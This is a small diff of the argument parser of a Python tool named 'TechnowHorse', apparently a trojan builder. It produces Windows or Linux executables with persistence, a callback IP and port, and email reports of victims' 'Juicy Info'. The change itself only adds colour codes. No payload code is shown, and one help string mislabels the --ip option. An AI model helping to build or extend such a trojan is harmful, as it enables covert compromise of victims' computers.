@@ -12,13 +12,13 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")
 
 def get_options():
-    parser = argparse.ArgumentParser(description='TechnowHorse v1.4')
-    parser._optionals.title = "Optional Arguments"
+    parser = argparse.ArgumentParser(description=f'{RED}TechnowHorse v1.4')
+    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
     parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
     parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
     parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10) 
 
-    required_arguments = parser.add_argument_group('Required Arguments')
+    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
     required_arguments.add_argument("--ip", dest="ip", help="Email address to send reports to.")
     required_arguments.add_argument("--port", dest="port", help="Port of the IP Address given in the --ip argument.")
     required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send \'TrojanHorse Started\' Notification with other Juicy Info.")
